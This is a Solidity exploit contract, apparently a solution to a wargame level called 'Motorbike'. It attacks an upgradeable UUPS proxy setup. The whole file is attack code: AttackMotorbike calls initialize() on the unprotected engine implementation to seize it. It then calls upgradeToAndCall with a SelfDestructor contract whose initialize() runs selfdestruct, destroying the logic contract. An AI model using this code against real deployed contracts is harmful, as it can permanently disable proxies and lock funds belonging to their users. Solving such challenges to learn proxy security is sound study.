// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Initializable {
    function initialize() external;
}

// Take advantage of the UUPS vulnerability
// figure out what is the address of engine contract by geting the storage of the constant slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
// Then initialized the new implementation and self destruct when calling the new implementation's initialize function
contract AttackMotorbike {
    address engine;
    event LogEvent(bool, bytes);

    constructor(address _engine) {
        engine = _engine;
    }

    function attack() public {
        (bool success, bytes memory data) = engine.call(
            abi.encodeWithSignature("initialize()")
        );
        emit LogEvent(success, data);
    }

    function destroyWithBomb() external {
        SelfDestructor destructor = new SelfDestructor();

        (bool success, bytes memory data) = engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(destructor),
                abi.encodeWithSignature("initialize()")
            )
        );
        emit LogEvent(success, data);
    }
}

contract SelfDestructor is Initializable {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}
